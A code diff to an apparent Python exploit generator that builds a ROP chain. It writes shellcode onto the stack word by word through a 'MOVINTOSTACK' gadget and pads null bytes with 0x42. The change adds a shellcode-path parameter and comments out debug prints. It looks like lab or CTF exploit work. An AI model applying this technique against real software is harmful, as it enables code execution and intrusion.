@@ -136,7 +136,9 @@ def add_null_term(curr_addr):
 
 
 ### MAIN FUNCTION TO CALL
-def gen(overflow_length):
+def gen(overflow_length, sh=shellcode_file_path):
+
+    shellcode_file_path = sh
 
     # read shellcode
     shellcode_bytes = read_shellcode(shellcode_file_path)
@@ -218,10 +220,10 @@ def gen(overflow_length):
     quad_bytes = []
 
     for b in shellcode_bytes:
-        print(b, quad_bytes)
+        # print(b, quad_bytes)
 
         if b == 0:
-            print("null found")
+            # print("null found")
             l = len(quad_bytes)
             for i in range(4-l):
                 quad_bytes.append(0x42)
@@ -250,7 +252,7 @@ def gen(overflow_length):
             word = 0
             for i in range(4):
                 word = word + quad_bytes[i] * (2 ** (i*8))
-            print(hex(word))
+            # print(hex(word))
             rop += pack('<I', word)
             # rop += pack('<I', quad_bytes)
             rop += gadgets['MOVINTOSTACK']
@@ -268,7 +270,7 @@ def gen(overflow_length):
             word = word + quad_bytes[i] * (2 ** (i*8))
         for i in range(4-l):
             word = word + 0x42 * (2 ** ((i+l)*8))
-        print(hex(word))
+        # print(hex(word))
         rop += pack('<I', word)
         # rop += pack('<I', quad_bytes)
         rop += gadgets['MOVINTOSTACK']
